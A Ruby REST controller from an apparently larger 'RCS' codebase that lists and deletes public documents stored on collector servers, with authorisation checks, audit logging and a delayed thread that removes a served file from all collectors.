#
# Controller for public documents on collectors
#

module RCS
module DB

class PublicController < RESTController

  def index
    require_auth_level :tech
    require_auth_level :tech_build

    mongoid_query do

      publics = ::PublicDocument.all

      return ok(publics)
    end
  end

  def destroy
    require_auth_level :tech
    require_auth_level :tech_build

    mongoid_query do
      public = ::PublicDocument.find(@params['_id'])

      # avoid error on request of already deleted documents
      return ok() if public.nil?

      Frontend.collector_del(public[:name])
      Audit.log :actor => @session.user[:name], :action => 'frontend.delete', :desc => "Deleted the file [#{public[:name]}] from the public folder"
      public.destroy

      # also delete all the other entry with the same name
      ::PublicDocument.destroy_all({name: public[:name]})

      return ok
    end
  end

  def destroy_file
    require_auth_level :server
    trace :info, "[#{@request[:peer]}] Has served a file and is requesting to delete #{@params['file']} from all collectors"

    # here we need to return to the callee and then issue the Frontend#collector_get
    # since it is called by a collector, it will stuck in the event loop waiting forever
    # so we create a thread, and after a small sleep we issue the delete on all frontends
    Thread.new do
      sleep 3
      Frontend.collector_del(@params['file'])
    end

    return ok
  end

end

end #DB::
end #RCS::